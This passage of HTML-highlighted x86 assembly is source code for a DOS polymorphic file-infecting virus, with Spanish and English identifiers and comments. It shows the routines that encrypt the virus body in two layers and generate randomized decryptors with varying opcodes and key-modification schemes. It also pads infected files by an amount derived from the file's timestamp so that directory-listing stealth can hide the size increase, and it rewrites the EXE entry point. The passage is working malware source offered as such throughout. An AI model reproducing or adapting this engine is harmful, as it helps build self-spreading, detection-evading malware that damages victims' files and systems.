        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TamanyoContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> </span><span class="sc1">; while constructing the de-</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus</span><span class="sc0">          </span><span class="sc1">; cryptor</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CriptaVirus</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LongDesencrip</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get size of second decryptor</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus</span><span class="sc0">        </span><span class="sc1">; Add size of clean virus</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Put it on CX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add Delta-offset to get ini-</span><span class="sc0">
                         </span><span class="sc1">; tial entry-point on the in-</span><span class="sc0">
                         </span><span class="sc1">; fected file</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Save DI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Put on DI the address whe-</span><span class="sc0">
                           </span><span class="sc1">; re the first decryptor will</span><span class="sc0">
                           </span><span class="sc1">; be constructed</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicValoresEXE</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> </span><span class="sc1">; IP on EXE ini-</span><span class="sc0">
                           </span><span class="sc1">; tial register values</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazVirus2</span><span class="sc0">        </span><span class="sc1">; Construct first decryptor</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Revalue CX with saved DI to</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; encrypt with the first layer</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CriptaVirus</span><span class="sc0">      </span><span class="sc1">; both virus (again) and se-</span><span class="sc0">
                         </span><span class="sc1">; cond decryptor</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Restore CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Add bytes to constructed vi-</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LongDesencrip</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; rus until it reaches the</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; static size of (LongVirus2-</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; -1Ah)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">001Ah</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKDCD</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@CCCDC</span><span class="sc0">       </span><span class="sc1">; If there is an error on size (too</span><span class="sc0">
                    </span><span class="sc1">; long), put 0 in CX and exit</span><span class="sc0">
   </span><span class="sc5">@@LCLC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@LCLC</span><span class="sc0">
</span><span class="sc5">@@KKDCD</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus2</span><span class="sc0">   </span><span class="sc1">; Now add a pseudo-random amount of</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; bytes to achieve different virus</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FE0h</span><span class="sc0">    </span><span class="sc1">; sizes in every file, but the stealth</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">        </span><span class="sc1">; has to continue working. I used a</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0">  </span><span class="sc5">@@FinNN</span><span class="sc0">        </span><span class="sc1">; little trick to do this, and it</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; consisted of adding the result of a</span><span class="sc0">
 </span><span class="sc5">@@JJJJJV</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">    </span><span class="sc1">; little operation with the hour and</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">            </span><span class="sc1">; minutes of the file. Then, it's very</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@JJJJJV</span><span class="sc0">       </span><span class="sc1">; easy to subtract this size when DIR</span><span class="sc0">
                     </span><span class="sc1">; is made, for example</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Restore CX</span><span class="sc0">
   </span><span class="sc5">@@FinNN</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">       </span><span class="sc1">; Now encrypt the file header and add</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; it to the end of the file. Then add</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0018h</span><span class="sc0">    </span><span class="sc1">; the byte-key of encryption and the</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">    </span><span class="sc1">; real seconds of the file</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Cabecera2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc5">@@Loopeo</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">       </span><span class="sc1">; Here it crypts every byte of the</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">            </span><span class="sc1">; header</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@Loopeo</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Here, there is a constructed virus</span><span class="sc0">
   </span><span class="sc5">@@KK34</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">       </span><span class="sc1">; in "NewVirus", that only has to be</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">       </span><span class="sc1">; added to the file to go well.</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
   </span><span class="sc5">@@CCCDC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; 0 to CX (error)</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@KK34</span><span class="sc0">         </span><span class="sc1">; Jump and exit</span><span class="sc0">
</span><span class="sc5">HazVirus</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;; Procedure to encrypt an especified amount of an especified part of virus</span><span class="sc0">
</span><span class="sc5">CriptaVirus</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">  </span><span class="sc1">; Begin to crypt here</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordEncriptado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Key of encryption</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordCambio</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Word for change key</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Banderas</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Flags of decryptor</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">         </span><span class="sc1">; Crypt by byte or word?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@JJJC</span><span class="sc0">              </span><span class="sc1">; If byte, jump</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Divide counter by 2</span><span class="sc0">
    </span><span class="sc5">@@JJJC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">         </span><span class="sc1">; Crypt by word (in BL)</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">      </span><span class="sc1">; Byte or word?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@JKJC</span><span class="sc0">           </span><span class="sc1">; If word, jump</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">         </span><span class="sc1">; Crypt by byte</span><span class="sc0">
    </span><span class="sc5">@@JKJC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010h</span><span class="sc0">      </span><span class="sc1">; XOR, ADD or SUB? (in decryptor)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonXORoADD</span><span class="sc0">     </span><span class="sc1">; If XOR or ADD, jump</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0008h</span><span class="sc0">      </span><span class="sc1">; XOR or SUB?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Siggg</span><span class="sc0">          </span><span class="sc1">; If SUB, jump and BL=opcode of ADD</span><span class="sc0">
     </span><span class="sc5">@@PonXOR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">        </span><span class="sc1">; BL=Opcode of XOR</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Siggg</span><span class="sc0">          </span><span class="sc1">; Jump</span><span class="sc0">
 </span><span class="sc5">@@PonXORoADD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0008h</span><span class="sc0">      </span><span class="sc1">; Test XOR or ADD</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonXOR</span><span class="sc0">         </span><span class="sc1">; If XOR, jump</span><span class="sc0">
     </span><span class="sc5">@@PonADD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">        </span><span class="sc1">; BL=Opcode of SUB</span><span class="sc0">
     </span><span class="sc5">@@Siggg</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OpcodeCrip</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0"> </span><span class="sc1">; Construct crypt ins-</span><span class="sc0">
                               </span><span class="sc1">; truction</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">      </span><span class="sc1">; Word crypting?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SiguR</span><span class="sc0">          </span><span class="sc1">; Then, jump</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">      </span><span class="sc1">; Direct crypting? (no register)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SiguR</span><span class="sc0">          </span><span class="sc1">; Then, jump</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0">      </span><span class="sc1">; High byte of register? (AH to DH)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SiguR</span><span class="sc0">          </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroEncriptado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc1">;If key isn't</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">    </span><span class="sc5">@@SiguR</span><span class="sc0">              </span><span class="sc1">; a ?X type register, jump</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">OpcodeCrip</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; Set crypting</span><span class="sc0">
                    </span><span class="sc1">; by the high byte of the key register</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Siguu</span><span class="sc0">       </span><span class="sc1">; Jump and continue</span><span class="sc0">
     </span><span class="sc5">@@SiguR</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">OpcodeCrip</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0"> </span><span class="sc1">; Set crypt-</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Siguu</span><span class="sc0">     </span><span class="sc1">; ting by the low byte of the key register</span><span class="sc0">
                  </span><span class="sc1">; and clear prefetch queue</span><span class="sc0">
</span><span class="sc5">OpcodeCrip</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">BYTE</span><span class="sc0">
     </span><span class="sc5">@@Siguu</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">  </span><span class="sc1">; Encrypt byte/word</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0"> </span><span class="sc1">; If direct crypting (no key register), jump</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Siguuu</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0004h</span><span class="sc0"> </span><span class="sc1">; Modify key?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Siguuu</span><span class="sc0">    </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0040h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ModifXORADD</span><span class="sc0">
 </span><span class="sc5">@@ModifSUBROL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ModifSUB</span><span class="sc0">
  </span><span class="sc5">@@ModifROL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; Modify key by ROL xx,1</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Siguuu</span><span class="sc0">
  </span><span class="sc5">@@ModifSUB</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">    </span><span class="sc1">; Modify key by SUB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Siguuu</span><span class="sc0">
 </span><span class="sc5">@@ModifXORADD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ModifXOR</span><span class="sc0">
  </span><span class="sc5">@@ModifADD</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">    </span><span class="sc1">; Modify key by ADD</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Siguuu</span><span class="sc0">
  </span><span class="sc5">@@ModifXOR</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">    </span><span class="sc1">; Modify key by XOR</span><span class="sc0">
     </span><span class="sc5">@@Siguuu</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0"> </span><span class="sc1">; Word or byte?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Siguu2</span><span class="sc0">    </span><span class="sc1">; Jump if byte</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
     </span><span class="sc5">@@Siguu2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">    </span><span class="sc1">; Increase index</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@Siguu</span><span class="sc0">     </span><span class="sc1">; Repeat</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">CriptaVirus</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">          </span><span class="sc1">; End of procedure</span><span class="sc0">

</span><span class="sc1">;;;;;; THIS IS THE MAIN PROCEDURE ON THE ENGINE. IT CREATES A DECRYPTOR WITH</span><span class="sc0">
</span><span class="sc1">;;;; THE DATA SET BEFORE</span><span class="sc0">
</span><span class="sc5">HazVirus2</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc1">; This variable controls when the decryptor can perform a CALL to any</span><span class="sc0">
    </span><span class="sc1">; CALL on the decryptor, not only the routine immediately above. When</span><span class="sc0">
    </span><span class="sc1">; 0, it can't</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoopYaEsta</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc1">; Clear "used register" fields. This is for indexed memory writes</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistrosUsados</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistrosUsados</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">              </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Set BP with a random word</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">@@Repite001</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get counter register</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Repite001</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">; Save it here</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonComoUsado</span><span class="sc0">   </span><span class="sc1">; Check if it is going to be used (to</span><span class="sc0">
                       </span><span class="sc1">; not use it on indexed memory writes)</span><span class="sc0">
